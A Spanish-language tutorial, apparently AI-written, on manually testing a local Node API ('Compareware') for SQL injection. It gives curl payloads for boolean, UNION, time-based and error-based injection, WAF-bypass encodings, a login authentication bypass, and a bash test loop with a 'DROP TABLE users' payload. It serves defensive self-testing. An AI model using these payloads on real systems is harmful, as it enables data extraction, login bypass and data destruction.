# 🎯 Guía de Pruebas Manuales de SQL Injection
## Proyecto Compareware - Testing Manual de Seguridad

> ⚠️ **IMPORTANTE**: Esta guía es únicamente para probar **TU PROPIO SISTEMA**. 
> Nunca uses estas técnicas en sistemas que no te pertenezcan - es ILEGAL.

---

## 📋 Preparación para las Pruebas

### 1. Configuración del Entorno de Testing

```bash
# 1. Asegúrate de que tu servidor esté ejecutándose
cd JavaS/api-node
npm start

# 2. Abre otra terminal para monitoreo en tiempo real
npm run security:logs

# 3. Ten a mano herramientas de testing
# - Navegador web con DevTools
# - Postman o cURL
# - Burp Suite (opcional)
```

### 2. Endpoints a Probar

Identifica los endpoints de tu aplicación que reciben datos del usuario:

```
✅ GET  /api/users/:id
✅ GET  /api/users/search?q=
✅ POST /api/auth/login
✅ GET  /api/perifericos/:id  
✅ GET  /api/comparaciones?filter=
✅ POST /api/users (crear usuario)
```

---

## 🔍 Metodología de Testing Manual

### Fase 1: Reconocimiento (Information Gathering)

#### 1.1 Probar Entrada Normal
```bash
# Primero, prueba con datos normales para establecer línea base
curl "http://localhost:3000/api/users/1"
curl "http://localhost:3000/api/users/search?q=admin"
```

**¿Qué observar?**
- ✅ Respuesta normal (200 OK)
- ✅ Tiempo de respuesta típico
- ✅ Estructura de respuesta JSON

#### 1.2 Probar Caracteres Especiales Simples
```bash
# Probar caracteres que podrían causar errores
curl "http://localhost:3000/api/users/search?q='"
curl "http://localhost:3000/api/users/search?q=\""
curl "http://localhost:3000/api/users/search?q=;"
```

**¿Qué observar?**
- 🚨 ¿Se muestra algún error de base de datos?
- 🚨 ¿Cambia el tiempo de respuesta?
- ✅ ¿El WAF bloquea el request (403)?

### Fase 2: Testing de Vulnerabilidades SQL

#### 2.1 Boolean-Based Blind SQL Injection

**Concepto**: Usar condiciones que devuelven TRUE o FALSE para extraer información.

```bash
# Test básico de condición verdadera
curl "http://localhost:3000/api/users?id=1 AND 1=1"

# Test básico de condición falsa  
curl "http://localhost:3000/api/users?id=1 AND 1=2"
```

**¿Qué observar?**
- 🚨 ¿Las respuestas son diferentes entre 1=1 y 1=2?
- 🚨 ¿La primera devuelve datos y la segunda no?
- ✅ ¿Ambas son bloqueadas por el WAF?

**Payloads progresivos para probar:**
```bash
# Nivel 1: Básico
curl "http://localhost:3000/api/users?id=1' AND '1'='1"
curl "http://localhost:3000/api/users?id=1' AND '1'='2"

# Nivel 2: Con comentarios
curl "http://localhost:3000/api/users?id=1' AND 1=1--"
curl "http://localhost:3000/api/users?id=1' AND 1=2--"

# Nivel 3: Extracción de información
curl "http://localhost:3000/api/users?id=1' AND LENGTH(DATABASE())>5--"
curl "http://localhost:3000/api/users?id=1' AND SUBSTRING(DATABASE(),1,1)='c'--"
```

#### 2.2 Union-Based SQL Injection

**Concepto**: Usar UNION para combinar resultados y extraer datos de otras tablas.

```bash
# Test básico de UNION
curl "http://localhost:3000/api/users?id=1' UNION SELECT 1,2,3--"

# Test con NULL (más común que funcione)
curl "http://localhost:3000/api/users?id=1' UNION SELECT null,null,null--"

# Intentar extraer información del sistema
curl "http://localhost:3000/api/users?id=1' UNION SELECT database(),user(),version()--"

# Intentar acceder a tablas del sistema
curl "http://localhost:3000/api/users?id=1' UNION SELECT table_name,null,null FROM information_schema.tables--"
```

**¿Qué observar?**
- 🚨 ¿Aparecen datos adicionales en la respuesta?
- 🚨 ¿Se muestran nombres de tablas o información de BD?
- ✅ ¿El WAF detecta y bloquea UNION?

#### 2.3 Time-Based Blind SQL Injection

**Concepto**: Usar funciones de tiempo para confirmar vulnerabilidades basándose en demoras.

```bash
# MySQL
curl -w "Tiempo total: %{time_total}s\n" "http://localhost:3000/api/users?id=1' AND SLEEP(5)--"

# PostgreSQL  
curl -w "Tiempo total: %{time_total}s\n" "http://localhost:3000/api/users?id=1'; SELECT PG_SLEEP(5)--"

# SQL Server
curl -w "Tiempo total: %{time_total}s\n" "http://localhost:3000/api/users?id=1'; WAITFOR DELAY '00:00:05'--"
```

**¿Qué observar?**
- 🚨 ¿El request tarda exactamente 5 segundos más de lo normal?
- 🚨 ¿Hay timeout en el cliente o servidor?
- ✅ ¿El WAF bloquea antes de que se ejecute?

#### 2.4 Error-Based SQL Injection

**Concepto**: Provocar errores de BD que revelen información en los mensajes.

```bash
# Errores básicos
curl "http://localhost:3000/api/users?id=1'"
curl "http://localhost:3000/api/users?id=1''"

# MySQL Error-based
curl "http://localhost:3000/api/users?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--"

# PostgreSQL Error-based  
curl "http://localhost:3000/api/users?id=1' AND CAST((SELECT version()) AS int)--"
```

**¿Qué observar?**
- 🚨 ¿Se muestran mensajes de error de MySQL/PostgreSQL/etc?
- 🚨 ¿Los errores revelan nombres de BD, tablas, o rutas?
- ✅ ¿Los errores están sanitizados o bloqueados?

---

## 🔧 Técnicas de Bypass para Probar

### 3.1 Bypass con Encoding

```bash
# URL Encoding
curl "http://localhost:3000/api/users?id=1%27%20OR%201%3D1--"

# Double URL Encoding  
curl "http://localhost:3000/api/users?id=1%2527%2520OR%25201%253D1--"

# Unicode Encoding
curl -H "Content-Type: application/json" -d '{"search": "admin\u0027 OR 1=1--"}' http://localhost:3000/api/users/search
```

### 3.2 Bypass con Comentarios

```bash
# Comentarios inline para dividir palabras clave
curl "http://localhost:3000/api/users?id=1' UN/**/ION SE/**/LECT 1,2,3--"

# Comentarios MySQL específicos
curl "http://localhost:3000/api/users?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3--"

# Comentarios con versión MySQL
curl "http://localhost:3000/api/users?id=1' /*!50000UNION SELECT*/ 1,2,3--"
```

### 3.3 Bypass con Espacios Alternativos

```bash
# Tabs y saltos de línea
curl "http://localhost:3000/api/users?id=1'%09UNION%0ASELECT%091,2,3--"

# Múltiples espacios
curl "http://localhost:3000/api/users?id=1'%20%20%20UNION%20%20%20SELECT%20%20%201,2,3--"

# Sin espacios usando paréntesis
curl "http://localhost:3000/api/users?id=1'UNION(SELECT(1),2,3)--"
```

---

## 📝 Testing Organizado con Checklist

### Checklist de Testing por Endpoint

#### ✅ GET /api/users/:id

```bash
# 1. Test normal
curl "http://localhost:3000/api/users/1" ✓

# 2. Inyección básica
curl "http://localhost:3000/api/users/1'" ✓

# 3. Boolean blind
curl "http://localhost:3000/api/users/1' AND 1=1--" ✓
curl "http://localhost:3000/api/users/1' AND 1=2--" ✓

# 4. Union-based
curl "http://localhost:3000/api/users/1' UNION SELECT 1,2,3--" ✓

# 5. Time-based
curl "http://localhost:3000/api/users/1' AND SLEEP(3)--" ✓

# Resultado esperado: 🛡️ TODOS BLOQUEADOS por WAF
```

#### ✅ POST /api/auth/login

```bash
# 1. Login normal
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"test","password":"test"}' \
     http://localhost:3000/api/auth/login ✓

# 2. SQL injection en username
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin'\''--","password":"anything"}' \
     http://localhost:3000/api/auth/login ✓

# 3. Authentication bypass
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin'\'' OR 1=1--","password":""}' \
     http://localhost:3000/api/auth/login ✓

# 4. Boolean injection
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin'\'' AND 1=1--","password":"test"}' \
     http://localhost:3000/api/auth/login ✓

# Resultado esperado: 🛡️ TODOS BLOQUEADOS por WAF
```

---

## 📊 Análisis de Resultados

### ✅ Respuestas SEGURAS (lo que quieres ver):

```json
{
  "success": false,
  "message": "Request blocked by security policy",
  "error": "ACCESS_DENIED",
  "requestId": "abc123",
  "timestamp": "2025-10-25T10:30:00.000Z"
}
```

**Códigos HTTP seguros:**
- `403 Forbidden` - WAF bloqueó el request
- `400 Bad Request` - Validación falló
- `429 Too Many Requests` - Rate limiting activo

### 🚨 Respuestas VULNERABLES (problemas):

```json
{
  "error": "mysql_fetch_array(): Argument #1 must be of type resource",
  "details": "You have an error in your SQL syntax near '1=1'"
}
```

```json
{
  "users": [
    {"id": 1, "name": "admin"},
    {"database": "compareware", "version": "8.0.30", "user": "root@localhost"}
  ]
}
```

**Señales de vulnerabilidad:**
- Errores de base de datos expuestos
- Información del sistema en respuestas
- Comportamiento diferente en condiciones TRUE/FALSE
- Delays anómalos en time-based injection

---

## 🛠️ Herramientas de Testing Manual

### 1. Browser DevTools

```javascript
// En la consola del navegador:
// Test rápido de XSS + SQL injection
fetch('/api/users?search=' + encodeURIComponent("' OR 1=1--"))
  .then(r => r.json())
  .then(console.log);

// Monitorear tiempo de respuesta
console.time('sqltest');
fetch('/api/users?id=' + encodeURIComponent("1' AND SLEEP(5)--"))
  .then(() => console.timeEnd('sqltest'));
```

### 2. Postman Collection

Crea una colección con estos tests:

```json
{
  "name": "SQL Injection Tests",
  "requests": [
    {
      "name": "Boolean True",
      "method": "GET",
      "url": "{{baseUrl}}/api/users?id=1' AND 1=1--"
    },
    {
      "name": "Boolean False", 
      "method": "GET",
      "url": "{{baseUrl}}/api/users?id=1' AND 1=2--"
    },
    {
      "name": "Union Attack",
      "method": "GET", 
      "url": "{{baseUrl}}/api/users?id=1' UNION SELECT 1,2,3--"
    }
  ]
}
```

### 3. Burp Suite (Profesional)

```
1. Configura proxy: 127.0.0.1:8080
2. Intercepta requests a tu aplicación  
3. Envía a Repeater para testing manual
4. Usa Intruder para ataques automatizados
5. Analiza responses en comparer
```

---

## 📈 Script de Testing Automatizado

```bash
#!/bin/bash
# manual_sqli_test.sh

echo "🎯 MANUAL SQL INJECTION TEST SUITE"
echo "=================================="

BASE_URL="http://localhost:3000"
PAYLOADS=(
    "1'"
    "1' AND 1=1--"
    "1' AND 1=2--" 
    "1' UNION SELECT 1,2,3--"
    "1' OR 1=1--"
    "admin'--"
    "'; DROP TABLE users--"
)

ENDPOINTS=(
    "/api/users"
    "/api/perifericos"
    "/api/comparaciones"
)

test_endpoint() {
    local endpoint=$1
    local payload=$2
    
    echo "Testing: $endpoint?id=$payload"
    
    response=$(curl -s -w "HTTPSTATUS:%{http_code};TIME:%{time_total}" \
                   "$BASE_URL$endpoint?id=$payload")
    
    http_code=$(echo $response | grep -o "HTTPSTATUS:[0-9]*" | cut -d: -f2)
    time_total=$(echo $response | grep -o "TIME:[0-9.]*" | cut -d: -f2)
    
    if [ "$http_code" = "403" ]; then
        echo "  ✅ BLOCKED (403) - Time: ${time_total}s"
    elif [ "$http_code" = "200" ]; then
        echo "  🚨 PASSED (200) - Time: ${time_total}s - VULNERABLE!"
    else
        echo "  ⚠️  OTHER ($http_code) - Time: ${time_total}s"
    fi
    
    sleep 0.5  # Rate limiting courtesy
}

# Ejecutar tests
for endpoint in "${ENDPOINTS[@]}"; do
    echo ""
    echo "📍 Testing endpoint: $endpoint"
    echo "--------------------------------"
    
    for payload in "${PAYLOADS[@]}"; do
        test_endpoint "$endpoint" "$payload"
    done
done

echo ""
echo "✅ Testing completed! Check logs for details."
```

---

## 🎓 Ejercicio Práctico Paso a Paso

### Ejercicio 1: Test Básico de Vulnerabilidad

1. **Prepara el entorno:**
   ```bash
   # Terminal 1: Inicia servidor
   cd JavaS/api-node && npm start
   
   # Terminal 2: Monitorea logs
   npm run security:logs
   ```

2. **Test normal (línea base):**
   ```bash
   curl "http://localhost:3000/api/users/1"
   ```
   
3. **Test con comilla simple:**
   ```bash
   curl "http://localhost:3000/api/users/1'"
   ```
   
4. **Analiza la respuesta:**
   - ✅ ¿Código 403? = WAF funcionando
   - 🚨 ¿Error de BD? = Vulnerable
   - 🚨 ¿Código 200? = Posible vulnerabilidad

5. **Revisa los logs:**
   - Busca "SQL_INJECTION_BLOCKED"
   - Verifica que se registre la IP y payload
   - Confirma que el riesgo sea marcado como HIGH/CRITICAL

### Ejercicio 2: Test de Authentication Bypass

1. **Login normal:**
   ```bash
   curl -X POST -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"wrongpass"}' \
        http://localhost:3000/api/auth/login
   ```

2. **Bypass attempt:**
   ```bash
   curl -X POST -H "Content-Type: application/json" \
        -d '{"username":"admin'\'' OR 1=1--","password":""}' \
        http://localhost:3000/api/auth/login
   ```

3. **Analiza:**
   - ✅ ¿Ambos fallan con 403? = Seguro
   - 🚨 ¿El segundo pasa? = CRÍTICO

---

## 📋 Reporte de Resultados

Documenta tus hallazgos así:

```markdown
# Reporte de Testing Manual SQL Injection
**Fecha:** 25/10/2025
**Tester:** [Tu nombre]
**Target:** http://localhost:3000

## Resumen Ejecutivo
- ✅ Endpoints probados: 5
- ✅ Payloads probados: 25  
- ✅ Vulnerabilidades encontradas: 0
- ✅ WAF effectiveness: 100%

## Detalles por Endpoint

### GET /api/users/:id
- **Status:** ✅ SEGURO
- **Payloads bloqueados:** 7/7
- **Tiempo promedio WAF:** 45ms
- **Observaciones:** Todas las inyecciones bloqueadas correctamente

### POST /api/auth/login  
- **Status:** ✅ SEGURO
- **Bypass attempts:** 0/5 exitosos
- **Observaciones:** Authentication bypass correctamente mitigado

## Recomendaciones
1. ✅ Mantener configuración actual del WAF
2. ✅ Continuar monitoreo de logs
3. ✅ Repetir testing mensualmente
```

---

## ⚡ Testing Rápido - 5 Minutos

Si tienes poco tiempo, ejecuta esto:

```bash
# Test esencial (copia y pega):
echo "🚀 QUICK SQL INJECTION TEST"

# 1. Boolean injection
curl -s "http://localhost:3000/api/users?id=1' AND 1=1--" | grep -q "blocked" && echo "✅ Boolean test: BLOCKED" || echo "🚨 Boolean test: VULNERABLE"

# 2. Union injection  
curl -s "http://localhost:3000/api/users?id=1' UNION SELECT 1,2,3--" | grep -q "blocked" && echo "✅ Union test: BLOCKED" || echo "🚨 Union test: VULNERABLE"

# 3. Auth bypass
curl -s -X POST -H "Content-Type: application/json" -d '{"username":"admin'\'' OR 1=1--","password":""}' http://localhost:3000/api/auth/login | grep -q "blocked" && echo "✅ Auth bypass: BLOCKED" || echo "🚨 Auth bypass: VULNERABLE"

echo "✅ Quick test completed!"
```

---

**¡Con esta guía puedes hacer testing manual profesional de SQL injection!** 

¿Quieres que profundicemos en alguna técnica específica o necesitas ayuda implementando algún test en particular?
